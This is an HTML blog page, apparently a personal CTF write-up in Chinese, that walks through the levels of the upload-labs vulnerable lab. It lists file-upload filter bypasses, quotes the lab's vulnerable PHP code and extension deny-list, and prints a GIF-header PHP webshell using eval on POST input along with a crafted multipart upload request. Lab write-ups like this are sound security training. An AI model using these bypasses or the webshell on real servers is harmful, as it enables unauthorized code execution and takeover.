@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="upload-labs writeup"/>
+  <meta name="twitter:description" content="upload-labs链接
+
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>upload-labs writeup &middot; Yang1k</title>
+		<link rel="shortcut icon" href="https://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://yang1k.github.io/post'>Archive</a>
+	<a href='https://yang1k.github.io/tags'>Tags</a>
+	<a href='https://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="https://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        upload-labs writeup
+                    </h1>
+                    <h2 class="headline">
+                    Jul 20, 2018 09:54
+                    · 388 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#pass-1">pass-1</a></li>
+<li><a href="#pass-2">pass-2</a></li>
+<li><a href="#pass-3">pass-3</a></li>
+<li><a href="#pass-4">pass-4</a></li>
+<li><a href="#pass-5">pass-5</a></li>
+<li><a href="#pass-6">pass-6</a></li>
+<li><a href="#pass-7">pass-7</a></li>
+<li><a href="#pass-8">pass-8</a></li>
+<li><a href="#pass-9">pass-9</a></li>
+<li><a href="#pass-10">pass-10</a></li>
+<li><a href="#pass-11">pass-11</a></li>
+<li><a href="#pass-12">pass-12</a></li>
+<li><a href="#pass-13">pass-13</a></li>
+<li><a href="#pass-14">pass-14</a></li>
+<li><a href="#pass-15">pass-15</a></li>
+<li><a href="#pass-16">pass-16</a></li>
+<li><a href="#pass-17">pass-17</a></li>
+<li><a href="#pass-18">pass-18</a></li>
+<li><a href="#pass-19">pass-19</a>
+<ul>
+<li><a href="#先知的解法">先知的解法</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p><a href="https://github.com/c0ny1/upload-labs">upload-labs链接</a></p>
+
+<!-- more -->
+
+<h4 id="pass-1">pass-1</h4>
+
+<p>将php文件修改为.jpg后缀,然后抓包修改后缀为php即可.</p>
+
+<h4 id="pass-2">pass-2</h4>
+
+<p>同上</p>
+
+<p>因为上传的文件是jpg后缀,所以在http数据包中的文件属性也都是jpg的,所以可以直接绕过对于content-type等文件属性的检查</p>
+
+<h4 id="pass-3">pass-3</h4>
+
+<p>上传php文件后,页面显示</p>
+
+<pre><code>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！ 
+</code></pre>
+
+<p>猜测可能是黑名单,尝试php3后缀,成功上传.</p>
+
+<h4 id="pass-4">pass-4</h4>
+
+<p>上传php文件,页面显示</p>
+
+<pre><code>提示：此文件不允许上传! 
+</code></pre>
+
+<p>随便写个后缀php122,上传成功,还是黑名单,测试php2,php3,php5,phtml后缀皆显示不允许上传,测试到pht后缀成功上传.</p>
+
+<p>拿这个后缀连着过了好几关&hellip;感觉不对,看源码,感觉是作者少加了这个后缀到黑名单.</p>
+
+<p><a href="https://xz.aliyun.com/t/2435#toc-4">先知的writeup这样做</a></p>
+
+<p>上传.htaccess文件,内容如下</p>
+
+<pre><code>SetHandler application/x-httpd-php
+
+</code></pre>
+
+<p>然后随便上传一个后缀都会解析为php.</p>
+
+<h4 id="pass-5">pass-5</h4>
+
+<p>这里还过滤了.htaccess,先知的文章是改变大小写,在linux下不行.</p>
+
+<h4 id="pass-6">pass-6</h4>
+
+<p>没有去除空格.所以可以在php后缀后添加空格绕过.</p>
+
+<h4 id="pass-7">pass-7</h4>
+
+<p>代码没有删掉文件后缀的点,Windows会自动去除后缀中的&rsquo;<code>.</code>&rsquo;,所以上传文件后缀为</p>
+
+<pre><code>1.php.
+</code></pre>
+
+<h4 id="pass-8">pass-8</h4>
+
+<p>再次利用Windows的特性,在后缀后添加<code>::$DATA</code></p>
+
+<p>上传的后缀为</p>
+
+<pre><code>1.php::$DATA
+</code></pre>
+
+<h4 id="pass-9">pass-9</h4>
+
+<p>没搞懂先知的writeup</p>
+
+<h4 id="pass-10">pass-10</h4>
+
+<p>单词混写绕过</p>
+
+<h4 id="pass-11">pass-11</h4>
+
+<p>用到%00截断,但是只存在于php5.3.4以下.</p>
+
+<p>使用方法有以下两种</p>
+
+<pre><code>在url中加入%00，如http://xxxx/shell.php%00.jpg
+在burpsuite的16进制编辑工具将”shell.php .jpg”（带空格的）中间的空格由20改成00
+</code></pre>
+
+<h4 id="pass-12">pass-12</h4>
+
+<p>这次的save_path是post到服务器的,所以不会进行自动解码,需要在burpsuite的hex进制里修改.</p>
+
+<h4 id="pass-13">pass-13</h4>
+
+<p>这里需要上传图片马.</p>
+
+<p>源码</p>
+
+<pre><code>function getReailFileType($filename){
+    $file = fopen($filename, &quot;rb&quot;);
+    $bin = fread($file, 2); //只读2字节
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
+    $fileType = '';    
+    switch($typeCode){      
+        case 255216:            
+            $fileType = 'jpg';
+            break;
+        case 13780:            
+            $fileType = 'png';
+            break;        
+        case 7173:            
+            $fileType = 'gif';
+            break;
+        default:            
+            $fileType = 'unknown';
+        }    
+        return $fileType;
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $file_type = getReailFileType($temp_file);
+
+    if($file_type == 'unknown'){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        }
+        else{
+            $msg = &quot;上传失败&quot;;
+        }
+    }
+}
+</code></pre>
+
+<p>阅读代码可知,getReailFileType函数只会读取文件的前两个字节,所以我们伪造一个文件头即可.</p>
+
+<p>文件内容如下</p>
+
+<pre><code>GIF89a
+&lt;?php
+
+echo 111111111;
+@eval($_POST['a']);
+
+?&gt;
+</code></pre>
+
+<p>然后include包含测试一下即可.</p>
+
+<h4 id="pass-14">pass-14</h4>
+
+<p>看源码</p>
+
+<pre><code>function isImage($filename){
+    $types = '.jpeg|.png|.gif';
+    if(file_exists($filename)){
+        $info = getimagesize($filename);
+        $ext = image_type_to_extension($info[2]);
+        if(stripos($types,$ext)){
+            return $ext;
+        }else{
+            return false;
+        }
+    }else{
+        return false;
+    }
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $res = isImage($temp_file);
+    if(!$res){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        }
+        else{
+            $msg = &quot;上传失败&quot;;
+        }
+    }
+}
+
+</code></pre>
+
+<p>这里用到了 getimagesize和image_type_to_extension两个函数</p>
+
+<p>官方定义</p>
+
+<pre><code>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。
+</code></pre>
+
+<pre><code>image_type_to_extension — 取得图像类型的文件后缀
+string image_type_to_extension ( int $imagetype [, bool $include_dot = TRUE ] )
+根据给定的常量 IMAGETYPE_XXX 返回后缀名。
+</code></pre>
+
+<p>仍然使用13关的图片马即可绕过.</p>
+
+<h4 id="pass-15">pass-15</h4>
+
+<p>开启了php_exif模块,</p>
+
+<p>还是使用之前的图片马.</p>
+
+<h4 id="pass-16">pass-16</h4>
+
+<p>另开了一篇写.</p>
+
+<h4 id="pass-17">pass-17</h4>
+
+<p>条件竞争</p>
+
+<p>源码</p>
+
+<pre><code>$is_upload = false;
+$msg = null;
+
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_name = $_FILES['upload_file']['name'];
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file = UPLOAD_PATH . '/' . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file)){
+        if(in_array($file_ext,$ext_arr)){
+             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        }else{
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        }
+    }else{
+        $msg = '上传失败！';
+    }
+}
+
+</code></pre>
+
+<p>分析可知流程大概是 先上传再检测,如果非法再删除.</p>
+
+<p>采用条件竞争即可.</p>
+
+<h4 id="pass-18">pass-18</h4>
+
+<p>同条件竞争</p>
+
+<h4 id="pass-19">pass-19</h4>
+
+<p>源码</p>
+
+<pre><code>if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = $_POST['save_name'];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) {
+            // $file_name = 'a.php';/
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path)) { 
+                $is_upload = true;
+            }else{
+                echo &quot;sdad$img_path&quot;;
+                $msg = '上传失败1111111111111！';
+            }
+        }else{
+            $msg = '禁止保存为该类型文件！';
+        }
+
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+
+<p>这里可以利用<code>1.php/.</code>的方式绕过.</p>
+
+<p>数据包如下</p>
+
+<pre><code>
+------WebKitFormBoundaryxkel2Wa6q51c7Ckn
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;
+Content-Type: application/x-php
+
+&lt;?php
+
+phpinfo();
+
+?&gt;
+------WebKitFormBoundaryxkel2Wa6q51c7Ckn
+Content-Disposition: form-data; name=&quot;save_name&quot;
+
+1.php/.
+------WebKitFormBoundaryxkel2Wa6q51c7Ckn
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+上传
+------WebKitFormBoundaryxkel2Wa6q51c7Ckn--
+
+</code></pre>
+
+<p>这种方式利用的<code>move_uploaded_file</code>函数,该函数会自动删掉文件名最好的<code>/.</code>.</p>
+
+<p>具体原理</p>
+
+<pre><code>http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html
+</code></pre>
+
+<h5 id="先知的解法">先知的解法</h5>
+
+<p>利用的是<code>move_uploaded_file</code>函数的00截断.<code>CVE-2015-2348</code>.</p>
+
+<p><a href="https://www.secpulse.com/archives/5767.html">复现文章</a></p>
+
+<p>00截断需要在php5.3.3版本以下,手头没有phpstudy,就不复现了.</p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fyang1k.github.io%2ftypecho%2fpost%2fupload-labs%2f - upload-labs%20writeup "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="https://yang1k.github.io/js/main.js"></script>
+<script src="https://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
